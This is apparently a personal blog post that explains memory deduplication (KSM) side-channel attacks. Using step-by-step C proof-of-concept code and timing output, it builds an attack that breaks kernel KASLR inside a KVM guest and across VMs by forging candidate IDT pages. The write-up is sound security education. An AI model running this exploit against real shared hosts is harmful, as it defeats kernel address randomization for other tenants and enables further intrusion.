---
layout: single
title:  "Understanding Memory Deduplication Attacks"
date: 2023-06-17
classes: wide
tags:
  - Exploitation
  - Sidechannels
  - Linux
  - KVM
  - KASLR
---

I recently came across a bunch of research describing attacks on memory deduplication, it has been used to fingerprint systems[1], crack (K)ASLR[2,3,4], leak database records[4], and even exploit rowhammer[5]. It's a really cool class of attacks that I hadn't heard of before, but I wasn't having much luck finding any POCs for these attacks... So, I figured I'd write up what I learned about how these attacks work and write my own version of one of these attacks that can be used break KASLR in KVM for the current VM as well as across VMs.

*The ability to break KASLR across VMs while also bypassing KPTI using deduplication was discovered by the authors of [3], I will just be exploring the basis for these attacks and writing my own attack based on their research.*

A repository of the code examples associated with this post can be found here: [github.com/zolutal/dedup-attacks](https://github.com/zolutal/dedup-attacks)

## wtf is deduplication

Memory deduplication is an optimization to reduce the amount of memory being used on a system. The idea being that similar processes are likely to have similar memory contents, so by pointing pages of memory that have the same content to the same physical address and marking them copy-on-write a large amount of memory can be saved.

Linux implements this via Kernel Same-Page Merging (KSM), which as the name implies "merges" pages with the same content by pointing them to the same physical memory. KSM will run periodically on a configurable interval, scanning a number of pages everytime for identical contents to merge.

Note that KSM may not be enabled by default, though it was enabled on both of my Ubuntu 22.04 machines. Also, not every page is mergable, on Linux pages are only mergable if they are explicitly marked as mergable, e.g. using madvise with MADV\_MERGABLE.

Documentation regarding how to enable and configure KSM is located here: [Kernel Samepage Merging](https://www.kernel.org/doc/html/v6.3/admin-guide/mm/ksm.html)

For reference, this was the default configuration for KSM on my Ubuntu machine:

```
/sys/kernel/mm/ksm/run:1
/sys/kernel/mm/ksm/stable_node_chains_prune_millisecs:2000
/sys/kernel/mm/ksm/merge_across_nodes:1
/sys/kernel/mm/ksm/use_zero_pages:0
/sys/kernel/mm/ksm/pages_to_scan:100
/sys/kernel/mm/ksm/sleep_millisecs:200
/sys/kernel/mm/ksm/use_zero_pages:0
```

## observing deduplication

As mentioned, when a page is merged it is made copy-on-write (CoW), in short this just means that it's access permissions are set to be not writeable (write-protected) so that a page fault will occur if it is written to. When the kernel sees that a page fault occurred from an attempt to write to a copy-on-write page, it will copy the contents of the page to a newly allocated page and perform the write operation on the new page.

So if we have a page that got deduplicated and we write to it, a page fault will occur. The page fault will have to be handled by the kernel which will have to identify the page fault was a write to a copy-on-write page, allocate a new page, copy the contents of the old page to the new one, and perform the write again all before returning to userspace. That's a whole lot of stuff to do which will take way longer than a non-faulting memory write, meaning we can easily use a timer to record whether or not a write was a faulting one allowing us to detect if deduplication occurred on a given page.

### timing page faults

Then the first step in exploiting deduplication is being able to detect when a page fault ocurrs. A simple way to demonstrate page fault detection is by using memory allocated using mmap. On Linux, the default behavior of mmap is to not immediately allocate the memory that is requested. This is because Linux implements demand paging, so pages aren't allocated memory until they are first accessed. We can see this from the example below.

{% highlight C %}
// write a null byte to addr
void poke(char *addr) { *addr = '\0'; }

// return the difference in the processor's timestamp before and after poke
uint64_t time_poke(char *addr) {
    uint64_t start = __rdtsc();
    poke(addr);
    uint64_t end = __rdtsc();
    return end-start;
}

// allocate a single read/write anon/private page
void *alloc_page() {
    return mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE, -1, 0);
}

int main() {
    void *page = alloc_page();

    // demonstrates that faulting accesses have distinct timings
    printf("fault     : %ld cycles\n", time_poke(page));
    printf("post-fault: %ld cycles\n", time_poke(page));
}
{% endhighlight %}

The timer isn't particularly precise but it doesn't really need to be because of how long page faults take, here is what I get running this code:

```
fault     : 7290 cycles
post-fault: 108 cycles
```

Notice the first access took way longer, this is because as described previously the page wasn't actually allocated until I attempted to access it. So when I wrote to it by calling poke a page fault occurred resulting in the kernel allocating memory for the page. Now when the second poke is timed the page is already allocated so the access occurs way faster and without a fault.

### timing un-merging

Cool! So now let's try to replicate this with madvise with MADV\_MERGABLE.

Pretty similar same setup besides the madvise and additional writes, just now we let the pages get merged and time the copy-on-write page fault instead of the demand paging page fault.

{% highlight C %}
...
// read a byte from addr
void maccess(char *addr) { volatile char c = *addr; }

// time maccess using the processor timestamp
uint64_t time_access(char *addr) {
    uint64_t start = __rdtsc();
    maccess(addr);
    uint64_t end = __rdtsc();
    return end-start;
}

int main() {
    // allocate victim and attacker pages
    void *victim = alloc_page();
    void *attacker = alloc_page();

    // mark both pages as mergable
    madvise(victim, 0x1000, MADV_MERGEABLE);
    madvise(attacker, 0x1000, MADV_MERGEABLE);

    // write something unique to both pages so they aren't merged with
    // other pages, this also faults them to be sure they are allocated
    *(uint64_t *)victim = 0x1337;
    *(uint64_t *)attacker = 0x1337;

    printf("sleeping to wait for merge...\n");

    sleep(10);

    printf("finished sleeping... checking access times\n");
    printf("read  : %ld cycles\n", time_access(attacker));
    printf("write : %ld cycles\n", time_poke(attacker));
    printf("write : %ld cycles\n", time_poke(attacker));

    return 0;
}
{% endhighlight %}

And here is what the output looks like:

```
sleeping to wait for merge...
finished sleeping... checking access times
read  : 54 cycles
write : 96768 cycles
write : 54 cycles
```

The initial read is quick, meaning the page is present and hasn't been swapped out or anything, but then the first write is extremely slow while the second write is quick. This result indicates that a page fault occurred on the first write due to the page having been merged, and the difference in timing for the pagefault was extremely distinct. So that now we know that we can observe memory deduplication let's look at how to exploit it.

## targeting KVM

Kernel Samepage Merging was originally designed with KVM in mind[7]. Though madvise exposes it to any application, KVM is still its main user and if it is enabled on the system qemu will use it by default.

### making sure KSM is enabled for KVM

To check if KSM is enabled on a system check the contents of /sys/kernel/mm/ksm/run, if this is set to '1' then KSM is enabled.

To check if KSM is enabled for qemu using KVM check the contents of /etc/default/qemu-kvm, if this is set to 'AUTO' or '1' then memory for qemu VMs that use KVM will be made mergeable.

### observing deduplication in KVM

Let's confirm that deduplication is detectable in KVM with a similar setup. I booted up a Linux VM using qemu-system-x86\_64 with '--enable-kvm' and '-cpu host' specified, and ran the following code.

{% highlight C %}
// allocate victim and attacker pages
void *victim = alloc_page();
void *attacker = alloc_page();

// write something unique to both pages so they aren't merged with
// other zero pages, this also faults them to be sure they are allocated
memset((char *)victim, 0x41, 0x1000);
memset((char *)attacker, 0x41, 0x1000);

while (1) {
    printf("sleeping to wait for merge...\n");

    sleep(20);

    printf("finished sleeping... checking access times\n");

    // make sure attacker is present and in cache
    time_access(attacker);

    printf("write : %ld cycles\n", time_poke(attacker));
    printf("write : %ld cycles\n", time_poke(attacker));
}
{% endhighlight %}

The only major differences between this test and the previous, aside from being inside a VM, are that the pages are no longer being marked mergeable using madvise, and the timing is wrapped in a loop (because the merging takes a bit longer with the amount of memory a VM uses).

Here is an example of the output from this test:

```
...
sleeping to wait for merge...
finished sleeping... checking access times
write : 81 cycles
write : 81 cycles
sleeping to wait for merge...
finished sleeping... checking access times
write : 55242 cycles
write : 54 cycles
...
```

So without even marking either of these pages as mergeable, we can see that deduplication occurred!

But this isn't very interesting yet, all we've done is show that we can see our own memory get merged together...

### breaking KASLR

So how can we break KASLR using memory deduplication?

The article describing this attack[2] targets relocations, the idea being that a number of instructions have to be adjusted after the kernel is rebased by KASLR, if we can find some code pages with only a few relocations then only the relocated instructions will differ between boot and leaking the relocated instructions will mean breaking KASLR. So if we just mmap a page in userspace with the contents of a kernel code page and bruteforce the relocations until merging occurs, we should have our leak!

Except that sounds kind of annoying, adjusting relocations in C? maybe it isn't actually *that* bad but I'd rather not... so I'll target something else that's a little more structured instead: the IDT.

The Interrupt Descriptor Table (IDT) is a decent target for this attack because it is full of entries that represent interrupt entry points, the entries only vary per boot by KASLR affecting what address they will point to. This makes the entries relatively easy to generate, I can just boot the VM, dump the IDT to collect the first qword of the each entry, rebase them to according to the lowest possible virtual address for the kernel to be located, and stick them into an array. I'll include a script I wrote in the repo that makes generating this array easy.

For an IDT with entries that look like this:

```
gef➤  x/16gx 0xfffffe0000000000
0xfffffe0000000000:	0x88808e0000100920	0x00000000ffffffff
0xfffffe0000000010:	0x88808e0300100c40	0x00000000ffffffff
0xfffffe0000000020:	0x88808e0200101680	0x00000000ffffffff
0xfffffe0000000030:	0x8880ee0000100b30	0x00000000ffffffff
0xfffffe0000000040:	0x8880ee0000100940	0x00000000ffffffff
0xfffffe0000000050:	0x88808e0000100960	0x00000000ffffffff
0xfffffe0000000060:	0x88808e0000100b10	0x00000000ffffffff
0xfffffe0000000070:	0x88808e0000100980	0x00000000ffffffff
```

I end up with an array that looks like this:

{% highlight C %}
uint64_t entries[256] = { 0x81208e0000100920, 0x81208e0300100c40, 0x81208e0200101680, 0x8120ee0000100b30, 0x8120ee0000100940, 0x81208e0000100960, 0x81208e0000100b10, 0x81208e0000100980, 0x81208e0100100ca0, 0x81208e00001009a0, 0x81208e0000100a20, 0x81208e0000100a50, 0x81208e0000100a80, 0x81208e0000100ab0, 0x81208e0000100b70, 0x81208e00001009c0, 0x81208e00001009e0, 0x81208e0000100ae0, 0x81208e0400100ba0, 0x81208e0000100a00, 0x81208e0000100db0, 0x82678e000010992d, 0x82678e0000109936, 0x82678e000010993f, 0x82678e0000109948, 0x82678e0000109951, 0x82678e000010995a, 0x82678e0000109963, 0x82678e000010996c, 0x81208e0500100d00, 0x82678e000010997e, 0x82678e0000109987, 0x81208e0000100f10, 0x81208e0000100228, 0x81208e0000100230, 0x81208e0000100238, 0x81208e0000100240, 0x81208e0000100248, 0x81208e0000100250, 0x81208e0000100258, 0x81208e0000100260, 0x81208e0000100268, 0x81208e0000100270, 0x81208e0000100278, 0x81208e0000100280, 0x81208e0000100288, 0x81208e0000100290, 0x81208e0000100298, 0x81208e00001002a0, 0x81208e00001002a8, 0x81208e00001002b0, 0x81208e00001002b8, 0x81208e00001002c0, 0x81208e00001002c8, 0x81208e00001002d0, 0x81208e00001002d8, 0x81208e00001002e0, 0x81208e00001002e8, 0x81208e00001002f0, 0x81208e00001002f8, 0x81208e0000100300, 0x81208e0000100308, 0x81208e0000100310, 0x81208e0000100318, 0x81208e0000100320, 0x81208e0000100328, 0x81208e0000100330, 0x81208e0000100338, 0x81208e0000100340, 0x81208e0000100348, 0x81208e0000100350, 0x81208e0000100358, 0x81208e0000100360, 0x81208e0000100368, 0x81208e0000100370, 0x81208e0000100378, 0x81208e0000100380, 0x81208e0000100388, 0x81208e0000100390, 0x81208e0000100398, 0x81208e00001003a0, 0x81208e00001003a8, 0x81208e00001003b0, 0x81208e00001003b8, 0x81208e00001003c0, 0x81208e00001003c8, 0x81208e00001003d0, 0x81208e00001003d8, 0x81208e00001003e0, 0x81208e00001003e8, 0x81208e00001003f0, 0x81208e00001003f8, 0x81208e0000100400, 0x81208e0000100408, 0x81208e0000100410, 0x81208e0000100418, 0x81208e0000100420, 0x81208e0000100428, 0x81208e0000100430, 0x81208e0000100438, 0x81208e0000100440, 0x81208e0000100448, 0x81208e0000100450, 0x81208e0000100458, 0x81208e0000100460, 0x81208e0000100468, 0x81208e0000100470, 0x81208e0000100478, 0x81208e0000100480, 0x81208e0000100488, 0x81208e0000100490, 0x81208e0000100498, 0x81208e00001004a0, 0x81208e00001004a8, 0x81208e00001004b0, 0x81208e00001004b8, 0x81208e00001004c0, 0x81208e00001004c8, 0x81208e00001004d0, 0x81208e00001004d8, 0x81208e00001004e0, 0x81208e00001004e8, 0x81208e00001004f0, 0x81208e00001004f8, 0x81208e0000100500, 0x81208e0000100508, 0x81208e0000100510, 0x81208e0000100518, 0x8120ee0000101a80, 0x81208e0000100528, 0x81208e0000100530, 0x81208e0000100538, 0x81208e0000100540, 0x81208e0000100548, 0x81208e0000100550, 0x81208e0000100558, 0x81208e0000100560, 0x81208e0000100568, 0x81208e0000100570, 0x81208e0000100578, 0x81208e0000100580, 0x81208e0000100588, 0x81208e0000100590, 0x81208e0000100598, 0x81208e00001005a0, 0x81208e00001005a8, 0x81208e00001005b0, 0x81208e00001005b8, 0x81208e00001005c0, 0x81208e00001005c8, 0x81208e00001005d0, 0x81208e00001005d8, 0x81208e00001005e0, 0x81208e00001005e8, 0x81208e00001005f0, 0x81208e00001005f8, 0x81208e0000100600, 0x81208e0000100608, 0x81208e0000100610, 0x81208e0000100618, 0x81208e0000100620, 0x81208e0000100628, 0x81208e0000100630, 0x81208e0000100638, 0x81208e0000100640, 0x81208e0000100648, 0x81208e0000100650, 0x81208e0000100658, 0x81208e0000100660, 0x81208e0000100668, 0x81208e0000100670, 0x81208e0000100678, 0x81208e0000100680, 0x81208e0000100688, 0x81208e0000100690, 0x81208e0000100698, 0x81208e00001006a0, 0x81208e00001006a8, 0x81208e00001006b0, 0x81208e00001006b8, 0x81208e00001006c0, 0x81208e00001006c8, 0x81208e00001006d0, 0x81208e00001006d8, 0x81208e00001006e0, 0x81208e00001006e8, 0x81208e00001006f0, 0x81208e00001006f8, 0x81208e0000100700, 0x81208e0000100708, 0x81208e0000100710, 0x81208e0000100718, 0x81208e0000100720, 0x81208e0000100728, 0x81208e0000100730, 0x81208e0000100738, 0x81208e0000100740, 0x81208e0000100748, 0x81208e0000100750, 0x81208e0000100758, 0x81208e0000100760, 0x81208e0000100768, 0x81208e0000100770, 0x81208e0000100778, 0x81208e0000100780, 0x81208e0000100788, 0x81208e0000100790, 0x81208e0000100798, 0x81208e00001007a0, 0x81208e00001007a8, 0x81208e00001007b0, 0x81208e00001007b8, 0x81208e00001007c0, 0x81208e00001007c8, 0x81208e00001007d0, 0x81208e00001007d8, 0x81208e00001007e0, 0x81208e00001007e8, 0x81208e00001007f0, 0x81208e00001007f8, 0x81208e0000100800, 0x81208e0000100808, 0x81208e0000100810, 0x81208e0000100818, 0x81208e0000100820, 0x81208e0000100828, 0x81208e0000100830, 0x81208e0000100838, 0x81208e0000100840, 0x81208e0000100848, 0x81208e0000100850, 0x81208e0000100858, 0x81208e0000100860, 0x81208e0000100868, 0x81208e0000100870, 0x81208e0000100878, 0x81208e0000100eb0, 0x81208e0000100888, 0x81208e0000100890, 0x81208e0000100898, 0x81208e0000101050, 0x81208e0000101030, 0x81208e0000101010, 0x81208e0000101110, 0x81208e0000100fb0, 0x81208e00001008c8, 0x81208e0000100ff0, 0x81208e0000100ed0, 0x81208e0000100f30, 0x81208e0000100f90, 0x81208e0000100fd0, 0x81208e0000100f50, 0x81208e0000100f70, 0x81208e0000100ef0, 0x81208e0000100e70, 0x81208e0000100e90 };
{% endhighlight %}

With that array created it is very easy to produce an IDT page for a potential KASLR offset:

{% highlight C %}
void *setup_idt_page(uint16_t offset) {
    uint64_t *page = alloc_page();
    for (int i = 0; i < 256; i++) {
        uint64_t shifted_offset = (uint64_t)offset << 53;
        page[i*2] = shifted_offset + entries[i];
        page[i*2+1] = 0x00000000ffffffff;
    }
    return page;
}
{% endhighlight %}

Now all that is left is to put it all together and we'll have constructed an attack that can break KASLR within KVM by exploiting KSM on IDT pages!

{% highlight C %}
// create candidate IDT pages
void *idt_pages[512];
for (int i = 0; i < 512; i++)
    idt_pages[i] = setup_idt_page(i);

// detect if any candidate pages were merged
int attempt = 0;
while (1) {
    printf("-- beginning attempt %d --\n", ++attempt);
    uint64_t results[512];
    for (int i = 0; i < 512; i++) {
        void *page = idt_pages[i];
        time_access(page);

        uint64_t first = time_poke(page);
        uint64_t second = time_poke(page);

        void *base = (void *)0xffffffff80000000 + (i << 21);
        printf("%p (%#03x): %ld => %ld\n", base, i, first, second);
        results[i] = first;
    }
    for (uint64_t i = 0; i < 512; i++) {
        if (results[i] > MERGE_THRESHOLD) {
            printf("detected merged page at index %#03lx\n", i);
            printf("kernel base = %p\n", (void *)0xffffffff80000000 + (i << 21));
            return 0;
        }
    }
    sleep(20);
}
{% endhighlight C %}

Under the default configurations for KSM on my host machine, I got a successful KASLR break in just under nine minutes on a VM that had been up for several minutes.

To see the attack working without having to wait so long, consider lowering KSM's sleep\_miliseconds config value to something more like 20ms.

### breaking KASLR across VMs

Okay how about across VMs now? well, there isn't actually anything more to do.

The code to break KASLR on the current VM already works across VMs, it will detect any matching IDTs that exist on any running VMs so long as they are using KSM.

Just to confirm this, I ran two VMs with the same kernel image and just removed the exit condition from the loop of the attack so it would keep running even if it found a deduplicated IDT page, and here are the results:

VM 1:
```
root@host:~/kvm-kaslr# cat /proc/kallsyms | grep "T _text"
ffffffffb5800000 T _text
```

VM 2:
```
/home/root # cat /proc/kallsyms | grep "T _text"
ffffffffb4400000 T _text
```

After running the attack for a while I got this:

```
detected merged page at index 0x1ac
kernel base = 0xffffffffb5800000
```

Followed shortly by:
```
detected merged page at index 0x1a2
kernel base = 0xffffffffb4400000
```

Cross VM leakage achieved!

## closing thoughts

Deduplication attacks are pretty cool and fairly simple to pull off, but I am slightly concerned that KSM was enabled on my machine without me knowing... not that I was exposing any VMs to the internet anyways but since it was enabled on my machine I worry where else is it might be unknowningly enabled. All I exploited it for in this post was breaking KASLR, but theoretically it could be used to leak the contents of any page from any VM on the system, and research has been done to see just how far it can be pushed[6].

Hope you learned something! This is my first attempt at blogging, it turned out a bit more code dense than I'd have liked, but hopefully the all the code examples made it easier to follow. I do kind of like the format of exploring an attack class and progressively developing an attack of that type, so maybe I'll do it again sometime.

## sources

[1] Rodney Owens and Weichao Wang. Non-interactive OS fingerprinting through memory de-duplication technique in virtual machines. In International Performance Computing and Communications Conference, 2011.

[2] Taehun Kim, Taehyun Kim, and Youngjoo Shin. Breaking kaslr using memory deduplication in virtualized environments. Electronics, 2021. URL: https://www.mdpi.com/2079-9292/10/17/2174.

[3] Antonio Barresi, Kaveh Razavi, Mathias Payer, and Thomas R. Gross. CAIN: silently breaking ASLR in the cloud. In WOOT, 2015.

[4] Martin Schwarzl, Erik Kraft, Moritz Lipp, and Daniel Gruss. Remote Page Deduplication Attacks. In NDSS, 2022.

[5] K. Razavi, B. Gras, E. Bosman, B. Preneel, C. Giuffrida, and H. Bos. Flip Feng Shui: Hammering a Needle in the Software Stack. in SEC, 2016.

[6] E. Bosman, K. Razavi, H. Bos, and C. Giuffrida. Dedup Est Machina: Memory Deduplication as an Advanced Exploitation Vector. In SP, 2016.

[7] [lwn: /dev/ksm: dynamic memory sharing](https://lwn.net/Articles/306704/)
